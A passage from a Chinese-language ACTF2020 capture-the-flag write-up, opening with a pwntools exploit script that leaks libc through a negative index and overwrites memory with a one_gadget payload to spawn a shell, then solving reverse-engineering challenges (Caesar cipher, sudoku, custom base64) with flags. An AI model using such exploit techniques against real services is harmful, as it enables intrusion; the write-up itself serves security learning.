class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./complaint'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc-2.23.so'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod</span><span class="params">(index, cont)</span>:</span></span><br><span class="line">    sla(<span class="string">'Your choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">'The complaint index you want to modify:\n'</span>,str(index))</span><br><span class="line">    sla(<span class="string">'Input your complaint:'</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sla(<span class="string">'Your choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">    sla(<span class="string">'The complaint index you want to show:\n'</span>,str(index))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">-16</span>)</span><br><span class="line">data = rc()</span><br><span class="line">stderr = uu64(data[<span class="number">448</span>+<span class="number">17</span>:<span class="number">448</span>+<span class="number">6</span>+<span class="number">17</span>])</span><br><span class="line">libc_base = stderr - libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">info_addr(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_local:</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x106ef8</span></span><br><span class="line"><span class="keyword">if</span> is_remote:</span><br><span class="line">    one_gadget = libc_base + <span class="number">0xf66f0</span></span><br><span class="line">    <span class="comment">#  0xf66f0 execve("/bin/sh", rcx, [rbp-0xf8])</span></span><br><span class="line">    <span class="comment">#constraints:</span></span><br><span class="line">    <span class="comment">#  [rcx] == NULL || rcx == NULL</span></span><br><span class="line">    <span class="comment">#  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> is_local:</span><br><span class="line">    payload = p64(stderr)*<span class="number">44</span>+p64(stderr+<span class="number">7936</span>)+p64(stderr)*<span class="number">7</span>+p64(<span class="number">0xffffffff</span>)+p64(stderr+<span class="number">0x1000</span>)*<span class="number">400</span>+p64(one_gadget)*<span class="number">100</span></span><br><span class="line">    <span class="comment">#                                  1                           -1          cmp rax,rcx               func</span></span><br><span class="line"><span class="keyword">if</span> is_remote:</span><br><span class="line">    payload = p64(stderr)*<span class="number">7</span>+p64(one_gadget)+p64(stderr)*<span class="number">10</span>+p64(stderr+<span class="number">4672</span>)+p64(stderr)*<span class="number">6</span>+p64(<span class="number">0xffffffff</span>)+p64(stderr)*<span class="number">31</span>+p64(stderr+<span class="number">8</span>)+p64(<span class="number">0</span>)*<span class="number">200</span></span><br><span class="line">    <span class="comment">#                             func                               1                            -1                           rbp</span></span><br><span class="line">mod(<span class="number">-16</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><hr><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><p>re题目都比较有意思，不过还是剩了两道题没做，有一到题pwn和re的结合体，然鹅并没有看懂出题人什么意思…还有一道TEA加密，唉，一看到密码就脑壳疼，果断放弃…</p><h2 id="Here-you-are"><a href="#Here-you-are" class="headerlink" title="Here_you_are"></a>Here_you_are</h2><ul><li><p>题目描述：</p><blockquote><p>This is your flag. Here you are.<br>IDA and OD are really my friends. Do you want to play with them too?</p></blockquote></li><li><p>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/Here_you_are/Sign_up.exe" target="_blank" rel="noopener">Sign_up.exe</a></p></li><li><p>考察点：没有</p></li><li><p>难度：入门</p></li><li><p>分值：100</p></li><li><p>完成人数：10</p></li></ul><p>直接找字符串就行:) </p><blockquote><p>IDA and OD are really my friends, but I just want to play with radare2.</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">19:42 taqini@q /home/taqini/Downloads/actf/re/sign</span><br><span class="line"><span class="meta">%</span><span class="bash"> rabin2 -zz Sign_up.exe | grep &#123;</span></span><br><span class="line">61  0x00001426 0x00403026 6   7    .rdata        ascii   %s&#123;...</span><br><span class="line">62  0x0000142d 0x0040302d 24  25   .rdata        ascii   ACTF&#123;Reverse_w3lcome_:)&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h2><ul><li>题目描述：Julius</li><li>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/rome/rome.exe" target="_blank" rel="noopener">rome.exe</a></li><li>考察点：逆向分析</li><li>难度：简单</li><li>分值：100</li><li>完成人数：6</li></ul><p>凯撒加密+大小写互换，主要代码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v1 + i) &gt; <span class="string">'@'</span> &amp;&amp; *(&amp;v1 + i) &lt;= <span class="string">'Z'</span> )</span><br><span class="line">        *(&amp;v1 + i) = (*(&amp;v1 + i) - <span class="string">'3'</span>) % <span class="number">26</span> + <span class="string">'A'</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v1 + i) &gt; <span class="string">'`'</span> &amp;&amp; *(&amp;v1 + i) &lt;= <span class="string">'z'</span> )</span><br><span class="line">        *(&amp;v1 + i) = (*(&amp;v1 + i) - <span class="string">'O'</span>) % <span class="number">26</span> + <span class="string">'a'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )&#123;</span><br><span class="line">result = *(&amp;v15 + i);</span><br><span class="line"><span class="keyword">if</span> ( *(&amp;v1 + i) != result )</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">result = <span class="built_in">printf</span>(<span class="string">"You are correct!"</span>);</span><br></pre></td></tr></table></figure></div><p>解密(懒得推算了，反正凯撒后的字母是一对一映射的，直接搞到映射表反解即可)：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string <span class="keyword">as</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(ss)</span>:</span></span><br><span class="line">ll = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ss:         </span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">in</span> s.ascii_lowercase:</span><br><span class="line">ll.append(chr((ord(i)-ord(<span class="string">'O'</span>))%<span class="number">26</span>+ord(<span class="string">'a'</span>)))</span><br><span class="line"><span class="keyword">elif</span> i <span class="keyword">in</span> s.ascii_uppercase:</span><br><span class="line">ll.append(chr((ord(i)-ord(<span class="string">'3'</span>))%<span class="number">26</span>+ord(<span class="string">'A'</span>)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ll.append(i)</span><br><span class="line"><span class="keyword">return</span> ll</span><br><span class="line">ans = <span class="string">'Qsw3sj_lz4_Ujw@l'</span></span><br><span class="line">d=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.ascii_uppercase:</span><br><span class="line">d[enc(i)[<span class="number">0</span>]]=i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.ascii_lowercase:</span><br><span class="line">d[enc(i)[<span class="number">0</span>]]=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">in</span> d:</span><br><span class="line">flag += d[i]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag += i</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># Cae3ar_th4_Gre@t</span></span><br></pre></td></tr></table></figure></div><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><ul><li>题目描述：打比赛打累了吧？来玩个小游戏？</li><li>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/game/game.exe" target="_blank" rel="noopener">game.exe</a></li><li>考察点：逆向分析，<del>数独游戏技能</del></li><li>难度：简单</li><li>分值：100</li><li>完成人数：5</li></ul><p>数独游戏，主要代码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc_to_num(user_input);</span><br><span class="line">fill_map(user_input, &amp;<span class="built_in">map</span>);</span><br><span class="line">check_map(&amp;<span class="built_in">map</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Congratulations, you successfully solved this little problem!"</span>);</span><br><span class="line"><span class="built_in">printf</span>(aFlag, buf);</span><br></pre></td></tr></table></figure></div><p>流程大概是将输入的<code>abcdefghi</code>转成数字<code>123456789</code>，然后按顺序填到棋盘中，最后分别检查每行、每列、每个九宫格内的数字是否合法。</p><p>这题只要分析出是数独游戏就好办了，<code>fill_map</code>这个函数中有个循环跑了81次，<code>check_map</code>函数中又有<code>9x9</code>的循环，由此可以想到这是个<code>9x9</code>的二维数组，到这里差不多就知道是数独了，dump出棋盘，玩儿一局数独就能拿到flag，美滋滋~</p><p>棋盘：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="number">5</span> <span class="number">0</span> <span class="number">1</span> <span class="number">4</span> <span class="number">0</span> <span class="number">6</span> <span class="number">8</span> <span class="number">9</span> </span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">8</span> <span class="number">9</span> <span class="number">0</span> <span class="number">6</span> <span class="number">2</span> <span class="number">0</span> <span class="number">5</span> </span><br><span class="line"><span class="number">6</span> <span class="number">7</span> <span class="number">9</span> <span class="number">2</span> <span class="number">5</span> <span class="number">8</span> <span class="number">1</span> <span class="number">4</span> <span class="number">3</span> </span><br><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">2</span> <span class="number">5</span> <span class="number">8</span> <span class="number">4</span> <span class="number">7</span> <span class="number">0</span> <span class="number">0</span> </span><br><span class="line"><span class="number">0</span> <span class="number">8</span> <span class="number">0</span> <span class="number">7</span> <span class="number">9</span> <span class="number">0</span> <span class="number">5</span> <span class="number">3</span> <span class="number">2</span> </span><br><span class="line"><span class="number">5</span> <span class="number">9</span> <span class="number">7</span> <span class="number">0</span> <span class="number">6</span> <span class="number">2</span> <span class="number">8</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7</span> <span class="number">2</span> <span class="number">4</span> <span class="number">0</span> <span class="number">1</span> <span class="number">3</span> <span class="number">0</span> <span class="number">5</span> <span class="number">8</span> </span><br><span class="line"><span class="number">8</span> <span class="number">6</span> <span class="number">5</span> <span class="number">4</span> <span class="number">7</span> <span class="number">9</span> <span class="number">3</span> <span class="number">0</span> <span class="number">1</span> </span><br><span class="line"><span class="number">9</span> <span class="number">3</span> <span class="number">1</span> <span class="number">8</span> <span class="number">2</span> <span class="number">5</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></div><p>脚本：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">codemap_s = <span class="string">'2 5 0 1 4 0 6 8 9 0 0 8 9 0 6 2 0 5 6 7 9 2 5 8 1 4 3 3 1 2 5 8 4 7 0 0 0 8 0 7 9 0 5 3 2 5 9 7 0 6 2 8 1 0 7 2 4 0 1 3 0 5 8 8 6 5 4 7 9 3 0 1 9 3 1 8 2 5 4 0 0'</span></span><br><span class="line">codemap = codemap_s.split()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    cnt = <span class="number">0</span> </span><br><span class="line">    cnt0 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> codemap:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'0'</span>:</span><br><span class="line">            cnt0 += <span class="number">1</span></span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> i,</span><br><span class="line">        <span class="keyword">if</span> cnt %<span class="number">9</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'count of 0: %s'</span>%cnt0</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">user = [<span class="number">3</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> user</span><br><span class="line"></span><br><span class="line">new_map = []</span><br><span class="line"></span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> codemap:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">'0'</span> <span class="keyword">and</span> pos &lt; len(user):</span><br><span class="line">        new_map.append(str(user[pos]))</span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_map.append(i)</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> user:</span><br><span class="line">    flag.append(chr(i+<span class="number">96</span>))</span><br><span class="line"></span><br><span class="line">codemap = new_map</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag&#123;%s&#125;"</span>%<span class="string">''</span>.join(flag)</span><br></pre></td></tr></table></figure></div><blockquote><p>p.s.数独真好玩儿</p></blockquote><h2 id="usualCrypt"><a href="#usualCrypt" class="headerlink" title="usualCrypt"></a>usualCrypt</h2><ul><li>题目描述：这个加密真的很常见，不信你看看</li><li>题目地址：<a href="https://github.com/TaQini/ctf/raw/master/ACTF2020/re/usualCrypt/base.exe" target="_blank" rel="noopener">base.exe</a></li><li>考察点：逆向分析</li><li>难度：简单</li><li>分值：100</li><li>完成人数：3</li></ul><p>输入字符串，经过自定义的<code>base64</code>加密后，与密文比对，解密密文即flag</p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>首先是<code>base64</code>换表</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">swap_Base_table</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> tmp; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    tmp = array_2[result];</span><br><span class="line">    array_2[result] = array_1[result];</span><br><span class="line">    array_1[result++] = tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( result &lt; <span class="number">15</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>原表：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/<br>新表：ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/</p></blockquote><p>然后就是正常的<code>base64</code>加密</p><p>最后还有个密文大小写互换</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">swap_Upper_Lower</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> chr; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(buf) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">      chr = buf[HIDWORD(i)];</span><br><span class="line">      <span class="keyword">if</span> ( chr &lt; <span class="number">97</span> || chr &gt; <span class="number">122</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( chr &lt; <span class="number">65</span> || chr &gt; <span class="number">90</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        LOBYTE(i) = chr + <span class="number">0x20</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        LOBYTE(i) = chr - <span class="number">0x20</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      buf[HIDWORD(i)] = i;</span><br><span class="line">LABEL_9:</span><br><span class="line">      LODWORD(i) = <span class="number">0</span>;</span><br><span class="line">      ++HIDWORD(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( HIDWORD(i) &lt; <span class="built_in">strlen</span>(buf) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>解密就照着加密步骤反过来操作就好</p><p>首先，生成<code>base64</code>编码表</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> <span class="built_in">array</span>[] = <span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *array_1 = <span class="built_in">array</span>;</span><br><span class="line"><span class="keyword">char</span> *array_2 = <span class="built_in">array</span>+<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">swap</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    v1 = array_2[result];</span><br><span class="line">    array_2[result] = array_1[result];</span><br><span class="line">    array_1[result++] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( result &lt; <span class="number">15</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="built_in">array</span>);</span><br><span class="line">    <span class="comment">//printf("%s\n",array_1);</span></span><br><span class="line">    <span class="comment">//printf("%s\n",array_2);</span></span><br><span class="line">    swap();</span><br><span class="line">    <span class="built_in">printf</span>(<span 